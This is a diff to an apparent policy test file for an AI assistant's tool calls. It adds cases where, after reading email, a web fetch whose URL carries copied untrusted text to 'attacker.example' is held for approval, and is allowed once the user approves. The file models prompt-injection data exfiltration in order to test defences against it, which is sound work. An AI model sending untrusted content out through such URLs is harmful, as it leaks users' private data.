@@ -3,7 +3,8 @@
 policies: ./output-labels.cedar
 catalog:
   web:
-    fetch: { readonly: true }
+    # Read-only, but the URL is delivered to the host it names: outbound.
+    fetch: { readonly: true, inputs: { url: string, note: string }, outbound: "url#host" }
   workspace:
     read_email: { readonly: true }
     send_email: {}
@@ -130,3 +131,33 @@ cases:
     call: { server: workspace, tool: delete_file }
     expect: deny
     reason: capability_denied
+
+  - name: a fetch whose URL copies untrusted text asks
+    chain: [assistant]
+    session: { tainted_by: [workspace/read_email], untrusted_args: [url] }
+    call: { server: web, tool: fetch, arguments: { url: "https://attacker.example/?q=copied" } }
+    expect: deny
+    reason: approval_required
+    policy_ids: [ask_on_untrusted_outbound]
+
+  - name: with a granted approval the fetch is allowed
+    chain: [assistant]
+    session: { tainted_by: [workspace/read_email], untrusted_args: [url] }
+    approval: { by: user }
+    call: { server: web, tool: fetch, arguments: { url: "https://attacker.example/?q=copied" } }
+    expect: allow
+    reason: policy_allow
+
+  - name: a matched span in an argument that is not outbound does not ask
+    chain: [assistant]
+    session: { tainted_by: [workspace/read_email], untrusted_args: [note] }
+    call: { server: web, tool: fetch, arguments: { url: "https://news.example/", note: copied } }
+    expect: allow
+    reason: policy_allow
+
+  - name: a fetch on a tainted run with no matched argument is allowed
+    chain: [assistant]
+    session: { tainted_by: [workspace/read_email] }
+    call: { server: web, tool: fetch, arguments: { url: "https://news.example/" } }
+    expect: allow
+    reason: policy_allow
